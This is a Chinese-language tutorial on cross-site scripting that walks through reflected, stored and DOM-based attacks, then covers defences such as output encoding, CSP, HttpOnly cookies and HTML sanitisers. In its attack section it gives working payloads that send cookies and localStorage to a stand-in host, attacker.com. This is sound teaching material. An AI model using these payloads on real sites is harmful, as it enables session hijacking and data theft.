XSS 跨站脚本攻击：原理、攻击与防御

安全 Web安全 XSS
发布日期:   2026-08-06

一、核心原理

XSS 的根本原因是用户可控数据被浏览器当作可执行代码解释。

浏览器解析 HTML 时，遇到 <script> 标签、事件处理属性（onerror、onload）、javascript: 伪协议，会将其中的内容作为 JavaScript 执行。如果这些位置的内容来自用户输入且未经转义，攻击者就能注入任意代码。

这与 SQL 注入的逻辑完全同构——SQL 注入是用户输入被数据库引擎当作 SQL 指令执行，XSS 是用户输入被浏览器当作 JavaScript 执行。区别只在于执行环境不同。

JavaScript 在同源策略下拥有对当前域名 Cookie、localStorage、DOM 的完全访问权限。一段恶意脚本能窃取会话、劫持操作、读取页面敏感数据、以用户身份调用后端 API。

二、三种 XSS 完整攻击实例

下面每种类型只讲一个完整场景，从发现漏洞到最终利用，走完全流程。

2.1 反射型 XSS：搜索框回显

场景： 一个电商网站的搜索功能，URL 为 https://shop.com/search?q=手机壳，页面将搜索词回显在结果区域。

第一步：找到注入点。 访问 https://shop.com/search?q=test，页面源码中出现：

<div class="search-result">
  <p>您搜索的关键词是：test</p>
  ...
</div>

服务端代码大致如下：

$keyword = $_GET['q'];
echo "<p>您搜索的关键词是：" . $keyword . "</p>";

用户输入被直接拼入 HTML，没有任何转义。

第二步：测试注入。 访问 https://shop.com/search?q=<script>alert(1)</script>，页面弹出了 alert 框。确认漏洞存在。

第三步：构造攻击链接。 攻击者编写一个窃取 Cookie 的脚本，部署在 https://attacker.com/steal.js：

// steal.js
new Image().src = 'https://attacker.com/log?cookie=' + encodeURIComponent(document.cookie);

攻击链接为：

https://shop.com/search?q=<script src="https://attacker.com/steal.js"></script>

第四步：社工投递。 攻击者通过邮件、论坛消息、群聊将这个链接发给目标用户。用户点击后，浏览器加载 shop.com 页面，页面中的 <script> 标签加载了攻击者的 JS，攻击者的 JS 在 shop.com 的上下文中执行，读取到 shop.com 的 Cookie 并发送到 attacker.com。

完整数据流：

用户点击恶意链接
  → 浏览器请求 shop.com/search?q=<script src=attacker.com/steal.js>
  → shop.com 返回 HTML，其中包含未转义的 <script> 标签
  → 浏览器解析 HTML，加载并执行 attacker.com/steal.js
  → steal.js 读取 document.cookie（shop.com 域下的 Cookie）
  → steal.js 创建 <img> 标签，src 指向 attacker.com/log?cookie=xxx
  → 攻击者服务器收到 Cookie

为什么这能成功？ 因为浏览器对 shop.com 返回的所有内容一视同仁地解析执行，它无法区分”shop.com 自己写的脚本”和”通过注入进来的脚本”。反射型 XSS 的本质就是攻击者借 shop.com 的嘴，对用户的浏览器说了假话。

2.2 存储型 XSS：评论区注入

场景： 一个论坛系统，用户可以发帖和评论。评论存入数据库，展示时从数据库取出拼入 HTML。

第一步：注入恶意评论。 攻击者注册账号，在任意帖子下发表评论：

这帖子写得真好！<img src=x onerror="fetch('https://attacker.com/hook',{method:'POST',body:JSON.stringify({url:location.href,cookie:document.cookie,localStorage:Object.entries(localStorage).reduce((a,[k,v])=>(a[k]=v,a),{})})})">

这条评论被存入数据库。注意这里没有用 <script> 标签，而是用 <img> 的 onerror 事件——因为很多系统会过滤 <script> 但忘记过滤事件属性。

第二步：等待受害者。 其他用户浏览该帖子，服务端从数据库取出评论，拼入页面：

<div class="comment">
  <span class="author">attacker</span>
  <p>这帖子写得真好！<img src=x onerror="fetch('https://attacker.com/hook',...)"></p>
</div>

第三步：自动执行。 浏览器解析到 <img src=x>，尝试加载图片 x，加载失败触发 onerror 事件，其中的 JavaScript 执行。脚本将当前页面的 URL、Cookie、localStorage 全部发送到 attacker.com。

完整数据流：

攻击者提交恶意评论
  → 评论存入数据库（包含 <img onerror=...>）
  → 受害者访问帖子页面
  → 服务端从数据库取评论，拼入 HTML 返回
  → 浏览器解析 HTML，遇到 <img src=x>
  → 图片加载失败，触发 onerror
  → onerror 中的 JS 执行，将 Cookie/localStorage 发送到 attacker.com

与反射型的关键区别： 攻击者只需注入一次，不需要诱导每个受害者点击特定链接。所有访问该帖子的人都会中招。这就是存储型 XSS 危害更大的原因。

实际案例参考： 2018 年某社交平台曾出现存储型 XSS，攻击者在个人签名中注入 <img onerror=...>，任何查看其个人资料的用户都会被窃取会话。

2.3 DOM 型 XSS：前端路由参数

场景： 一个单页应用（SPA），使用 hash 路由，页面中有一段代码根据 URL hash 显示当前板块名称。

第一步：找到危险 sink。 页面 JS 代码如下：

// 从 URL hash 中取板块名，显示在页面上
function renderSection() {
  const section = decodeURIComponent(location.hash.slice(1));
  document.getElementById('section-title').innerHTML = section;
}
window.addEventListener('hashchange', renderSection);
renderSection();

数据来源（source）是 location.hash，危险操作（sink）是 innerHTML。整条链路完全在客户端完成，恶意数据从未到达服务端。

第二步：构造 payload。 访问：

https://spa.com/#<img src=x onerror=alert(document.cookie)>

location.hash 的值为 #<img src=x onerror=alert(document.cookie)>，slice(1) 去掉 #，decodeURIComponent 解码后赋值给 innerHTML。浏览器解析 innerHTML 中的 HTML 标签，<img> 触发 onerror。

第三步：利用。 实际攻击中，攻击者可以构造更复杂的 payload：

https://spa.com/#<img src=x onerror="fetch('https://attacker.com/hook',{method:'POST',body:document.cookie})">

完整数据流：

用户访问恶意 URL
  → 浏览器加载 spa.com 页面
  → 页面 JS 执行 renderSection()
  → location.hash 取出 "#<img src=x onerror=...>"
  → decodeURIComponent 解码
  → 赋值给 innerHTML
  → 浏览器解析 innerHTML 中的 HTML
  → <img> 触发 onerror，JS 执行
  → Cookie 被发送到 attacker.com

为什么 WAF 防不住？ 因为恶意数据从未经过服务端——它完全存在于 URL 的 hash 部分（# 后面的内容），浏览器发送 HTTP 请求时根本不会把 hash 发给服务器。传统 WAF 检查的是 HTTP 请求内容，自然看不到。

DOM 型 XSS 的常见 source 和 sink：

source（数据来源）：location.hash、location.search、document.referrer、window.name、postMessage 的 data。

sink（危险操作）：innerHTML、outerHTML、document.write、document.writeln、eval、setTimeout（字符串参数）、new Function。

只要数据从 source 流到 sink 的过程中没有经过转义，就存在 DOM 型 XSS。

三、防御策略详解

3.1 输出编码：根据上下文选对编码函数

输出编码是 XSS 防御的基石。原理很简单：将特殊字符转换为它们在对应上下文中不具备语法含义的表示形式。

关键认知：不存在一种通用的”XSS 过滤”，因为 HTML 的不同位置有不同的语法规则。 同一段用户输入，插入到 HTML 标签之间和插入到 JS 字符串中，需要完全不同的编码方式。

场景一：数据插入 HTML 标签之间

<p>用户输入在这里</p>

需要编码的字符：& → &amp;、< → &lt;、> → &gt;、" → &quot;、' → &#x27;。

// Java: OWASP Java Encoder
String safe = Encode.forHtml(userInput);
// 输入: <script>alert(1)</script>
// 输出: &lt;script&gt;alert(1)&lt;/script&gt;
// 浏览器渲染为纯文本，不会执行

# Python: markupsafe
from markupsafe import escape
safe = escape(user_input)

// PHP
$safe = htmlspecialchars($userInput, ENT_QUOTES | ENT_HTML5, 'UTF-8');

编码后 <script> 变成了 &lt;script&gt;，浏览器看到 &lt; 知道这是文本内容中的字符，不会当作标签解析。

场景二：数据插入 HTML 属性值内

<input value="用户输入在这里">

除了上述字符，还需要确保用户输入不能闭合属性值的引号。如果只编码 < > 而不编码 "，攻击者输入 " onclick="alert(1) 就能逃出属性：

<!-- 未编码引号 -->
<input value="" onclick="alert(1)"">

String safe = Encode.forHtmlAttribute(userInput);
// 额外编码 " ' 等可能闭合属性的字符

场景三：数据插入 JavaScript 代码块

<script>
  var name = "用户输入在这里";
</script>

这里需要编码的是 JS 字符串的元字符："、'、\、换行符、以及 </script> 序列（浏览器遇到这个序列就会闭合 script 标签，不管它在 JS 字符串内部）。

String safe = Encode.forJavaScript(userInput);
// 输入: "; alert(1); //
// 输出: \x22; alert(1); //
// 双引号被编码为 \x22，不会闭合字符串字面量

# Python: 将 JSON 嵌入 HTML 时的安全做法
# 错误：
# <script>var data = {{ user_data | safe }};</script>
# 正确：
# <script>var data = {{ user_data | tojson }};</script>
# tojson 会编码 < > & 等字符为 \uXXXX 形式

场景四：数据插入 URL 参数

<a href="/search?q=用户输入">搜索</a>

需要 URL 编码，防止用户输入 " 闭合属性或 javascript: 改变协议：

String safe = Encode.forUriComponent(userInput);
// 输入: " onclick=alert(1)
// 输出: %22%20onclick%3Dalert%281%29

核心原则总结： 数据在哪个位置使用，就用那个位置的编码函数。混用等于没防。

3.2 Content Security Policy（CSP）：浏览器层面的兜底

即使输出编码做对了，CSP 仍然是必要的——它提供了最后一道防线。

CSP 通过 HTTP 响应头告诉浏览器：只允许加载和执行来自特定来源的脚本。

基础配置：

Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'

含义：默认只允许同源资源；脚本只允许同源；禁止 <object>/<embed>。

这条配置下，即使存在 XSS 注入点，攻击者注入的 <script>alert(1)</script> 是内联脚本，而 CSP 默认禁止所有内联脚本执行（包括 <script> 标签内容和 onclick 等事件属性）。

为什么禁止内联脚本就能挡住大部分攻击？ 因为大多数 XSS payload 都是内联的——要么是一段 <script> 代码，要么是 onerror 事件属性。CSP 禁止内联脚本后，这些 payload 全部失效。

但攻击者可能加载外部脚本： 如果 CSP 没有严格限制 script-src，攻击者可能从允许的域加载脚本。所以 script-src 'self' 意味着只允许同源脚本，外部域的脚本也会被拦截。

nonce 机制（推荐）： 对于必须使用内联脚本的场景，用 nonce 精确控制：

Content-Security-Policy: script-src 'nonce-rAnd0mV4lu3'

<!-- 只有携带正确 nonce 的脚本才能执行 -->
<script nonce="rAnd0mV4lu3">
  console.log('safe');
</script>

<!-- 攻击者注入的脚本没有 nonce，被拦截 -->
<script>alert(1)</script>

每次 HTTP 请求生成新的随机 nonce，攻击者无法预测，所以注入的脚本无法通过 CSP 校验。

hash 机制： 对于内容固定的内联脚本，可以用 hash 代替 nonce：

Content-Security-Policy: script-src 'sha256-xxxBase64Hash'

<script>console.log('fixed content')</script>

浏览器计算脚本内容的 SHA-256，与 CSP 头中的 hash 比对，匹配才执行。

CSP 部署建议： 先用 Content-Security-Policy-Report-Only 模式部署，观察报告日志中哪些合法脚本被误拦截，调整策略后再切换到 enforcement 模式（Content-Security-Policy）。避免直接上线导致页面功能异常。

3.3 HttpOnly Cookie：让 XSS 偷不到会话

Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict

HttpOnly 阻止 JavaScript 通过 document.cookie 读取 Cookie。浏览器仍然会在 HTTP 请求中自动携带这个 Cookie，但 JS 代码看不到它。

document.cookie  // 返回 ""（空字符串），HttpOnly 的 Cookie 不在其中

三个标志各自的作用：

HttpOnly：阻止 JS 读取。防御 XSS 窃取 Cookie。

Secure：只通过 HTTPS 传输。防止中间人抓包拿到 Cookie。

SameSite=Strict：跨站请求不携带。防御 CSRF（攻击者在自己的页面上发起请求时，浏览器不会带上目标站的 Cookie）。Lax 是较宽松的版本，允许顶级导航（如用户点击链接跳转）携带 Cookie，但阻止 AJAX 和表单跨站提交。

局限性： HttpOnly 只保护 Cookie。如果应用将 token 存在 localStorage 中，XSS 仍然可以通过 localStorage.getItem('token') 窃取。所以敏感数据不要存在 localStorage 中，优先使用 HttpOnly Cookie。

3.4 输入验证：在入口处收窄攻击面

输入验证不能替代输出编码，但它能在数据进入系统时就拦截明显恶意的内容，减少后续每个处理环节的风险。

白名单优于黑名单。 黑名单永远有遗漏（攻击者总能找到你没列出的变体），白名单只允许已知安全的输入。

import re

# 用户名：只允许字母数字下划线，3-20 位
def validate_username(username):
    if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
        raise ValueError("Invalid username")
    return username

# 年龄：只允许数字
def validate_age(age_str):
    age = int(age_str)
    if age < 0 or age > 150:
        raise ValueError("Invalid age")
    return age

# 邮箱：使用标准库验证
from email.utils import parseaddr
def validate_email(raw):
    name, addr = parseaddr(raw)
    if not addr or '@' not in addr:
        raise ValueError("Invalid email")
    return addr

对于富文本输入，白名单验证不适用（用户确实需要提交 HTML），这时需要专门的 HTML 清洗（见 3.6）。

输入验证的正确定位： 它是纵深防御的一层，用于拦截格式明显错误的输入。但它不能覆盖所有 XSS 场景——合法输入中也可能包含需要编码的字符（比如用户名字符串中恰好包含 <），所以必须配合输出编码。

3.5 模板引擎与框架的默认防护

现代模板引擎默认对变量做 HTML 转义，大幅降低了 XSS 风险。理解它们的默认行为和”逃生舱”是安全使用的前提。

默认安全的：

{# Jinja2 (Flask)：{{ }} 自动转义 #}
<p>{{ user_input }}</p>

{# Django：{{ }} 自动转义 #}
<p>{{ user_input }}</p>

{# Thymeleaf (Spring)：th:text 自动转义 #}
<p th:text="${userInput}"></p>

{# EJS (Node.js)：<%= %> 自动转义 #}
<p><%= userInput %></p>

{# React：{} 自动转义 #}
<div>{userInput}</div>

{# Vue：{{ }} 自动转义 #}
<p>{{ userInput }}</p>

危险的逃生舱（跳过转义）：

{# Jinja2：|safe 跳过转义 #}
<p>{{ user_input | safe }}</p>

{# Django：|safe 跳过转义 #}
<p>{{ user_input | safe }}</p>

{# React：dangerouslySetInnerHTML 跳过转义 #}
<div dangerouslySetInnerHTML={{__html: userInput}} />

{# Vue：v-html 跳过转义 #}
<p v-html="userInput"></p>

{# Angular：bypassSecurityTrustHtml 跳过转义 #}
<div [innerHTML]="userInput"></div>

使用这些逃生舱时，开发者必须确保数据已经过清洗或来自可信来源。如果数据来自用户输入，直接使用逃生舱等于主动放弃防护。

JSP 的特殊情况： <%= variable %> 不会自动转义。需要手动调用 StringEscapeUtils 或配置 <%@ page escapeXml="true" %>。很多老项目使用 JSP，这是 XSS 的高发区。

3.6 富文本清洗：当用户确实需要提交 HTML

论坛、博客、CMS 等场景允许用户提交 HTML 格式的内容，不能简单做全量转义（否则加粗、链接等格式全部丢失）。需要专门的 HTML 清洗库，只保留安全标签和属性。

// JavaScript: DOMPurify（最推荐的前端清洗库）
import DOMPurify from 'dompurify';

const clean = DOMPurify.sanitize(dirtyHtml, {
  ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a', 'img', 'ul', 'ol', 'li', 'blockquote', 'code', 'pre'],
  ALLOWED_ATTR: ['href', 'src', 'alt', 'title', 'target'],
  ALLOW_DATA_ATTR: false,       // 禁止 data-* 属性
  ALLOWED_URI_REGEXP: /^(?:(?:(?:f|ht)tps?|mailto|tel|callto|cid|xmpp):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i  // 禁止 javascript: 协议
});

# Python: bleach
import bleach

clean = bleach.clean(
    dirty_html,
    tags=['p', 'b', 'i', 'em', 'strong', 'a', 'img', 'ul', 'ol', 'li'],
    attributes={
        'a': ['href', 'title', 'target'],
        'img': ['src', 'alt', 'title']
    },
    protocols={'href': ['http', 'https', 'mailto']},  # 禁止 javascript: 协议
    strip=True  # 移除不安全的标签（而非转义）
)

// Java: OWASP Java HTML Sanitizer
PolicyFactory policy = new HtmlPolicyBuilder()
    .allowElements("p", "b", "i", "em", "strong", "a", "img", "ul", "ol", "li")
    .allowAttributes("href").onElements("a")
    .allowAttributes("src", "alt").onElements("img")
    .allowUrlProtocols("https", "http", "mailto")  // 禁止 javascript:
    .allowAttributes("target").matching(true, "_blank").onElements("a")  // target 只允许 _blank
    .toFactory();

String safeHtml = policy.sanitize(dirtyHtml);

必须禁止的内容：

<script>、<iframe>、<object>、<embed>、<applet>、<form> 标签——这些标签天然具有代码执行或页面嵌套能力。

所有 on* 事件属性（onerror、onload、onclick 等）——这是 XSS 注入的主要载体。

javascript: 协议的 URL——在 href、src、style 等属性中，javascript: 可以直接执行代码。

<style> 标签和 style 属性中的 expression()、url()——IE 低版本中 CSS 也可执行代码，现代浏览器中 url() 仍可能触发 SSRF。

3.7 安全响应头

除了 CSP，还有几个响应头能降低 XSS 风险：

X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
X-Frame-Options: DENY

nosniff 阻止浏览器 MIME 嗅探。如果服务端返回一个 JSON 文件但 Content-Type 设置错误为 text/html，浏览器会把它当 HTML 解析，可能触发 XSS。nosniff 让浏览器严格按照服务端声明的 Content-Type 处理。

X-XSS-Protection 是旧版 IE/Chrome 的内置 XSS 过滤器，检测到反射型 XSS 时阻止页面渲染。现代浏览器已废弃此头（CSP 取代了它的功能），但为兼容旧浏览器仍建议设置。

X-Frame-Options: DENY 阻止页面被嵌入 <iframe>，防御点击劫持（Clickjacking）。攻击者无法再将你的页面嵌入恶意 iframe 中诱导用户操作。

四、各语言常见陷阱

4.1 Java

JSP 的 <%= variable %> 不自动转义，是老项目 XSS 的第一大来源。Spring MVC 的 @ResponseBody 返回 JSON 时，如果 Content-Type 被错误设置为 text/html，JSON 中的用户数据会被浏览器当 HTML 解析。StringEscapeUtils.escapeHtml() 在旧版 Commons Lang 中不处理所有 Unicode 控制字符。

4.2 PHP

echo $userInput 不做任何转义，是最常见的 XSS 根源。htmlspecialchars() 必须指定 ENT_QUOTES | ENT_HTML5 和 'UTF-8'，否则单引号和特殊编码可能绕过。$_SERVER['PHP_SELF'] 包含 URL 路径，直接用于 form action 属性时路径部分可被注入。

4.3 Python

Flask 的 render_template_string 使用 {{ variable | safe }} 会跳过转义。Django 的 mark_safe() 和 |safe 过滤器同理。json.dumps() 默认不转义 < > &，JSON 嵌入 HTML 时需要用 |tojson 过滤器或手动设置 ensure_ascii=True。

4.4 Node.js

Express 的 res.send(userInput) 如果 Content-Type 是 text/html，直接输出未转义内容。EJS 的 <%- %> 不转义、<%= %> 转义，容易混淆。前端如果用 innerHTML 渲染后端返回的 JSON 数据，即使后端是安全的，前端仍然会触发 XSS。

五、防御优先级总结

按重要程度排列：

  1. 输出编码——根据数据插入的上下文（HTML/属性/JS/URL）选择对应编码函数，这是最根本的防御
  2. 使用默认转义的模板引擎——Jinja2、Django templates、Thymeleaf、React、Vue，默认都安全；避免使用 |safe、v-html、dangerouslySetInnerHTML 等逃生舱
  3. CSP——部署 script-src 'nonce-xxx' 策略，作为输出编码之外的兜底
  4. 富文本清洗——使用 DOMPurify / bleach / OWASP Sanitizer，白名单控制允许的标签和属性
  5. HttpOnly + Secure + SameSite Cookie——让 XSS 即使存在也偷不到会话
  6. 输入验证——白名单校验格式固定的字段（用户名、邮箱、数字）
  7. 安全响应头——nosniff、X-Frame-Options
  8. 避免危险 sink——不使用 innerHTML、document.write、eval，改用 textContent、createElement
